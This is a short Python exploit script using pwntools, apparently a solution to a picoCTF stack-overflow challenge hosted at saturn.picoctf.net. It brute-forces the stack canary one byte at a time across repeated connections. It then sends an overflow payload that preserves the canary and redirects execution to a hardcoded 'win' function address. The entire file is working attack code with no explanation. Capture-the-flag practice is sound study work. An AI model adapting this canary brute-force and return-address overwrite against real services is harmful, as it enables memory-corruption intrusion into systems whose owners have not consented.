from pwn import *

BUFFER_SIZE = 64

def canary_brute_force():
    canary = ''
    for i in range(1, 5):
        for c in range(256):
            p = remote('saturn.picoctf.net',62184)
            p.sendlineafter('>', str(BUFFER_SIZE+i).encode("utf-8")) # we want to send BUFFER_SIZE bytes + current guess of canary
            payload = 'A'*64 + canary + chr(c)
            p.sendlineafter('>', payload.encode("utf-8"))

            #Check if we smash the stack
            if 'Stack' not in str(p.recvall()):
                canary += chr(c) 
                log.info(f'Current value: {canary}')
                break
    return canary

canary = ''

with log.progress("Step 1: Canary brute force"):
	canary = canary_brute_force()
	log.info(f'Canary found: {canary}') 

# payload buffer
payload = b'A'*BUFFER_SIZE
payload += bytes(canary, encoding='utf8')
payload += b'B'*16
payload += p32(0x8049336) # Address of win function (from gdb: p win)

p = remote('saturn.picoctf.net',62184)
p.sendlineafter('>', str(len(payload))) 
p.sendlineafter('>', payload) 
print(payload)
print(str(p.recvall()))